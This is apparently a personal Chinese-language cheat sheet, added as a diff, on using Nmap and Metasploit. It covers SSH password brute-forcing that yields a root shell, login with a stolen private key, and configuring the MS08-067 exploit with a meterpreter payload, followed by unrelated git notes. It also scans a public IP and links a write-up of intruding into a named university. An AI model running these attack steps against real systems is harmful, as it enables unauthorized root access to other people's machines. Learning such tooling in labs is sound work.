@@ -1,0 +1,315 @@
+<pre>root@evanpc:~# msfconsole
+                                                  
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |
+  +---------------------------+---------------------------+
+  |      __________________   |                           |
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
+  |             )=\           | |  EXPLOIT   \            |
+  |            // \\          | |_____________\_______    |
+  |           //   \\         | |==[msf >]============\   |
+  |          //     \\        | |______________________\  |
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
+  |        //         \\      |  *********************    |
+  +---------------------------+---------------------------+
+  |      o O o                |        \'\/\/\/'/         |
+  |              o O          |         )======(          |
+  |                 o         |       .'  LOOT  '.        |
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
+  | |________________|__|)__| |    |     __||_)     |     |
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
+  |  = = = = = = = = = = = =  |     '--------------'      |
+  +---------------------------+---------------------------+
+</pre>
+
+
+
+
+==查看目标机器信息==
+
+在NMAP中后面跟着目标的IP地址的-sP开关将指示NMAP对目标执行一次ping扫描。NMAP不仅能测试出目标计算机是否在线，还会通过发送一个ARP，请求数据包测试出目标计算机的Mac地址（物理地址）。不过当目标阻止ICMP数据包时3，NMAP ping扫描会通过从基于ICMP的数据包更改为基于TCP的数据包自动切换该途径。
+
+下一步的工作就是找出目标计算机的操作系统以及开放端口的信息。端口扫描就是寻找目标计算机上开放的端口并识别在这些端口上运行的服务。NMAP提供了很多种用于识别开放端口的方法。NMAP命令中可以使用-O开关来完成对目标的操作系统类型检测、设备类型识别、网络距离分析、端口开放检测以及开放端口上运行的服务检测。执行的命令语句与NMAP扫描结果如下面的屏幕截图所示。
+
+#喜欢这个参数
+nmap -sS -sV ip 
+root@evanpc:~# nmap -sV 192.168.1.97
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-21 11:56 CST
+Nmap scan report for 192.168.1.97
+Host is up (0.00047s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)
+80/tcp   open  http    nginx 1.
+3306/tcp open  mysql   MySQL 5.-log
+MAC Address: 36:30:39:38:35:37 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
+root@evanpc:~# 
+
+
+==Meterpreter ==
+=== 启动准备===
+service postgresql start
+root@evanpc:~# ss -ant | grep 5432
+LISTEN     0      128    127.0.0.1:5432                     *:*                  
+ESTAB      0      0      192.168.1.158:54324              45.63.53.9:22                 
+LISTEN     0      128        ::1:5432   
+
+#initialize the msf database
+msfdb init
+
+#Launch msfconsole
+msfconsole
+
+#verify database connectivity with the db_status command as shown below.
+msf > db_status
+[*] postgresql connected to msf
+
+
+=== scan ssh === 
+==== 渗透密码===
+msf > use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(ssh_login) > 
+
+msf auxiliary(ssh_login) > set RHOSTS 192.168.1.199
+RHOSTS => 192.168.1.199
+msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+msf auxiliary(ssh_login) > set VERBOSE false
+VERBOSE => false
+msf auxiliary(ssh_login) > run 
+
+[*] SSH - Starting bruteforce
+[+] SSH - Success: 'root:root' 'uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux vm.com 2.6.32-642.el6.x86_64 #1 SMP Tue May 10 17:27:01 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
+[*] Command shell session 1 opened (192.168.1.158:35911 -> 192.168.1.199:22) at 2017-03-21 12:07:17 +0800
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+# Success 字样 看到没有 哈哈 
+
+====add pubkey ====
+ssh_login_pubkey
+
+Using public key authentication for SSH is highly regarded as being far more secure than using usernames and passwords to authenticate. The caveat to this is that if the private key portion of the key pair is not kept secure, the security of the configuration is thrown right out the window. If, during an engagement, you get access to a private SSH key, you can use the ssh_login_pubkey module to attempt to login across a range of devices.
+
+msf > use auxiliary/scanner/ssh/ssh_login_pubkey
+msf auxiliary(ssh_login_pubkey) > show options
+
+Module options (auxiliary/scanner/ssh/ssh_login_pubkey):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   KEY_PATH                           yes       Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in ".pub" will be skipped.
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERNAME                           no        A specific username to authenticate as
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+msf auxiliary(ssh_login_pubkey) > set KEY_FILE /tmp/id_rsa
+KEY_FILE => /tmp/id_rsa
+msf auxiliary(ssh_login_pubkey) > set USERNAME root
+USERNAME => root
+msf auxiliary(ssh_login_pubkey) > set RHOSTS 192.168.1.154
+RHOSTS => 192.168.1.154
+msf auxiliary(ssh_login_pubkey) > run
+
+[*] 192.168.1.154:22 - SSH - Testing Cleartext Keys
+[*] 192.168.1.154:22 - SSH - Trying 1 cleartext key per user.
+[*] Command shell session 1 opened (?? -> ??) at 2010-09-09 17:17:56 -0600
+[+] 192.168.1.154:22 - SSH - Success: 'root':'57:c3:11:5d:77:c5:63:90:33:2d:c5:c4:99:78:62:7a' 'uid=0(root) gid=0(root) groups=0(root) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(ssh_login_pubkey) > sessions -i 1
+[*] Starting interaction with 1...
+
+ls
+reset_logs.sh
+id
+uid=0(root) gid=0(root) groups=0(root)
+exit
+[*] Command shell session 1 closed.
+msf auxiliary(ssh_login_pubkey) >
+
+
+
+
+
+#ssh_version info 
+msf auxiliary(ssh_version) > use auxiliary/scanner/ssh/ssh_version
+msf auxiliary(ssh_version) > set RHOSTS  192.168.1.97
+RHOSTS => 192.168.1.97
+msf auxiliary(ssh_version) > show actions
+
+Auxiliary actions:
+
+   Name  Description
+   ----  -----------
+
+
+msf auxiliary(ssh_version) > run 
+
+[*] 192.168.1.97:22       - SSH server version: SSH-2.0-OpenSSH_5.3 ( service.version=5.3 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.protocol=ssh fingerprint_db=ssh.banner )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+#扫描端口
+root@evanpc:~# nmap -p 1-1000 45.113.70.122
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-21 15:51 CST
+Nmap scan report for 45.113.70.122
+Host is up (0.30s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 62.23 seconds
+
+
+
+
+=== 其它常用===
+选择一个漏洞：
+msf exploit(ms08_067_netapi) > search  platform: windows 7
+
+msf exploit(ms08_067_netapi) > back 
+
+看某个漏洞的详细信息；包含使用方法、支持的平台等等
+msf > info exploit/windows/smb/ms08_067_netapi
+
+msf > use  exploit/windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > set payload windows/meterpreter/bind_tcp
+payload => windows/meterpreter/bind_tcp
+msf exploit(ms08_067_netapi) > set RHOST 192.168.1.88
+RHOST => 192.168.1.88
+
+#用“show options”查看是否配置好，可以看到已经配置好了
+show options
+
+#然后执行“exploit”命令，看到执行成功，直接进入会话：
+
+msf exploit(ms08_067_netapi) > exploit 
+
+
+MAC地址查看 如果是物理机 是可以查看到的，如果是虚拟机 当然是哈哈哈哈
+
+https://mac.51240.com/
+
+
+
+
+PS: 可以在 msf  终端运行nmap  等等各种shell 
+
+
+
+==  参考==
+演示使用Metasploit入侵Android
+http://topspeedsnail.com/kali-linux-metasploit-hack-android/
+
+
+good 演示使用Metasploit入侵Windows
+http://topspeedsnail.com/kali-linux-n-hack-windows-xp/
+
+Metasploit Framework
+http://docs.kali.org/general-use/starting-metasploit-framework-in-kali
+
+Scanner SSH Auxiliary Modules
+https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/
+
+
+The ultimate guide to the Metasploit Framework
+https://www.offensive-security.com/metasploit-unleashed/
+
+Metasploit/Kali 漏洞检测
+http://www.mxpwn.com/1209.html
+
+渗透攻防工具篇-后渗透阶段的Meterpreter
+https://zhuanlan.zhihu.com/p/23677530
+
+nmap+msf入侵广西师范
+http://www.metasploit.cn/thread-293-1-1.html
+
+针对80端口对Windows 7操作系统的一次渗透测试 
+http://book.51cto.com/art/201605/511262.htm
+
+meterpreter 练习命令
+http://helloeveryone.blog.51cto.com/6171143/1112040
+
+metasploit渗透一条龙
+http://lmwen.top/2016/08/06/metasploit%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/
+
+
+Linux下利用nc命令来监控检测服务器的端口使用情况
+http://huangrs.blog.51cto.com/2677571/967512
+
+
+
+Metasploit与漏洞扫描
+http://js.sunansheng.com/p/9568f663ad1e#
+
+139 445  MS08067/MS10061漏洞靶机环境搭建总结
+
+http://www.voidcn.com/blog/sql_injection/article/p-4509261.html
+
+nmap 查看 Linux机器开放的端口
+http://snailwarrior.blog.51cto.com/680306/137291
+
+几个Linux端口扫描器
+https://baoz.net/linux-port-scanner/
+
+
+Metasploit渗透系列教程第二章情报收集
+https://zhuanlan.zhihu.com/p/21768120
+
+Using the MSFconsole Interface
+https://www.offensive-security.com/metasploit-unleashed/msfconsole/
+
+
+
+Meterpreter Basic Commands
+https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
+
+
+#####  git 常用方法  
+#2.拉回来
+git pull
+#33.添加和推上去
+git add .  #添加当前目录下的所有文件和子目录
+git commit -m  "`date`"  #"dbbak and cutnglog"
+git push  origin master 
+#git push 
+
+#有时记得要删除
+# 位于分支 master
+# 尚未暂存以备提交的变更：
+#   （使用 "git add/rm <file>..." 更新要提交的内容）
+#   （使用 "git checkout -- <file>..." 丢弃工作区的改动）
+#   删除：      document/plan
+#   删除：      document/plan~
+#修改尚未加入提交（使用 "git add" 和/或 "git commit -a"）
+
+…or create a new repository on the command line
+
+echo "# penetration" >> README.md
+git init
+git add README.md
+git commit -m "first commit"
+git remote add origin git@github.com:evan886/penetration.git
+git push -u origin master
+
+…or push an existing repository from the command line
+git remote add origin git@github.com:evan886/penetration.git
+git push -u origin master
+
+…or import code from another repository
+You can initialize this repository with code from a Subversion, Mercurial, or TFS project.
+
